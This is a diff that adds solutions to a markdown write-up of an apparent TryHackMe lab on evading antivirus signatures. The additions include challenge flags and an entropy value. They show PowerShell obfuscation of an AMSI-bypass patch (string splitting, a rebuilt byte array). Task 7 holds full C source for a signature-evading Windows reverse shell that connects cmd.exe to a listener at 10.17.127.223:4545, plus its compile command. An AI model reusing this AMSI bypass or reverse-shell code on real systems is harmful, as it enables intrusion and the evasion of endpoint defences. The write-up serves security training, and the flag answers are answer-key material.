@@ -242,6 +242,36 @@ Once sufficiently obfuscated, submit the snippet to the webserver at `http://MAC
 
 * What flag is found after uploading a properly obfuscated snippet?
 
+    * Change script 1
+        
+        ```
+        $A = "AmsiScanBuffer"
+
+        to
+
+        $A = "AmsiS"+"canBuffer"
+        ```
+
+    * Change script 2
+    
+        ```
+        $buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3); 
+
+        to
+
+        $buf = new-object byte[] 6
+        $buf[0] = [UInt32]0xB8
+        $buf[1] = [UInt32]0x57
+        $buf[2] = [UInt32]0x00
+        $buf[3] = [Uint32]0x07
+        $buf[4] = [Uint32]0x80
+        $buf[5] = [Uint32]0xC3
+        ```
+
+    ![task4-flag](./images/task4-flag.png)
+
+    **Answer : THM{70_D373C7_0r_70_N07_D373C7}**
+
 ## Task 5 - Static Property-Based Signatures
 
 Various detection engines or analysts may consider different indicators rather than strings or static signatures to contribute to their hypothesis. Signatures can be attached to several file properties, including file hash, entropy, author, name, or other identifiable information to be used individually or in conjunction. These properties are often used in rule sets such as **YARA** or **Sigma**.
@@ -335,6 +365,10 @@ In the white paper, [An Empirical Assessment of Endpoint Detection and Response 
 
 * Rounded to three decimal places, what is the Shannon entropy of the file?
 
+    ![task5-entropy](./images/task5-entropy.png)
+
+    **Answer : 6.354**
+
 ## Task 6 - Behavioral Signatures
 
 Obfuscating functions and properties can achieve a lot with minimal modification. Even after breaking static signatures attached to a file, modern engines may still observe the behavior and functionality of the binary. This presents numerous problems for attackers that cannot be solved with simple obfuscation.
@@ -420,6 +454,12 @@ Once sufficiently obfuscated, submit the snippet to the webserver at `http://MAC
 ### Answer the questions below
 
 * What flag is found after uploading a properly obfuscated snippet?
+    
+    ![task6-script](./images/task6-script.png)
+
+    ![task6-flag](./images/task6-flag.png)
+
+    **Answer : THM{N0_1MP0r75_F0r_Y0U}**
 
 ## Task 7 - Putting It All Together
 
@@ -592,6 +632,90 @@ x86_64-w64-mingw32-gcc challenge.c -o challenge.exe -lwsock32 -lws2_32
 ### Answer the questions below
 
 * What is the flag found on the Administrator desktop?
+
+    * Change script
+
+        ```
+        #include <winsock2.h>
+        #include <windows.h>
+        #include <ws2tcpip.h>
+        #include <stdio.h>
+
+        #define DEFAULT_BUFLEN 1024
+
+        typedef int(WSAAPI* WSASTARTUP)(WORD wVersionRequested,LPWSADATA lpWSAData);
+        typedef SOCKET(WSAAPI* WSASOCKETA)(int af,int type,int protocol,LPWSAPROTOCOL_INFOA lpProtocolInfo,GROUP g,DWORD dwFlags);
+        typedef unsigned(WSAAPI* INET_ADDR)(const char *cp);
+        typedef u_short(WSAAPI* HTONS)(u_short hostshort);
+        typedef int(WSAAPI* WSACONNECT)(SOCKET s,const struct sockaddr *name,int namelen,LPWSABUF lpCallerData,LPWSABUF lpCalleeData,LPQOS lpSQOS,LPQOS lpGQOS);
+        typedef int(WSAAPI* CLOSESOCKET)(SOCKET s);
+        typedef int(WSAAPI* WSACLEANUP)(void);
+
+        void runn(char* serv, int Port) {
+            HMODULE hws2_32 = LoadLibraryW(L"ws2_32");
+            WSASTARTUP myWSAStartup = (WSASTARTUP) GetProcAddress(hws2_32, "WSAStartup");
+            WSASOCKETA myWSASocketA = (WSASOCKETA) GetProcAddress(hws2_32, "WSASocketA");
+            INET_ADDR myinet_addr = (INET_ADDR) GetProcAddress(hws2_32, "inet_addr");
+            HTONS myhtons = (HTONS) GetProcAddress(hws2_32, "htons");
+            WSACONNECT myWSAConnect = (WSACONNECT) GetProcAddress(hws2_32, "WSAConnect");
+            CLOSESOCKET myclosesocket = (CLOSESOCKET) GetProcAddress(hws2_32, "closesocket");
+            WSACLEANUP myWSACleanup = (WSACLEANUP) GetProcAddress(hws2_32, "WSACleanup");
+            SOCKET S0;
+            struct sockaddr_in addr;
+            WSADATA version;
+            myWSAStartup(MAKEWORD(2,2), &version);
+            S0 = myWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
+            addr.sin_family = AF_INET;
+            addr.sin_addr.s_addr = myinet_addr(serv);
+            addr.sin_port = myhtons(Port);
+            if (myWSAConnect(S0, (SOCKADDR*)&addr, sizeof(addr), 0, 0, 0, 0)==SOCKET_ERROR) {
+                myclosesocket(S0);
+                myWSACleanup();
+            } else {
+                char p1[] = "cm";
+                char p2[]="d.exe";
+                char* p = strcat(p1,p2);
+                STARTUPINFO sinfo;
+                PROCESS_INFORMATION pinfo;
+                memset(&sinfo, 0, sizeof(sinfo));
+                sinfo.cb = sizeof(sinfo);
+                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) S0;
+                CreateProcess(NULL, p, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
+                WaitForSingleObject(pinfo.hProcess, INFINITE);
+                CloseHandle(pinfo.hProcess);
+                CloseHandle(pinfo.hThread);
+            }
+        }
+
+        int main(int argc, char **argv) {
+            if (argc == 3) {
+                int port = atoi(argv[2]);
+                runn(argv[1], port);
+            } else {
+                char host[] = "10.17.127.223";
+                int port = 4545;
+                runn(host, port);
+            }
+            return 0;
+        }
+        ```
+
+    * Compile cript to exe file
+        
+        ```
+        x86_64-w64-mingw32-gcc challenge.c -o challenge.exe -lwsock32 -lws2_32
+        ``` 
+    
+    * Set listener on attacker machine
+    
+        ![task7-listener](./images/task7-listener.png)
+
+    * Get the flag
+
+        ![task7-flag](./images/task7-flag.png)
+
+    **Answer : THM{08FU5C4710N_15 MY_10V3_14N6U463}**
 
 ## Task 8 - Conclusion
 
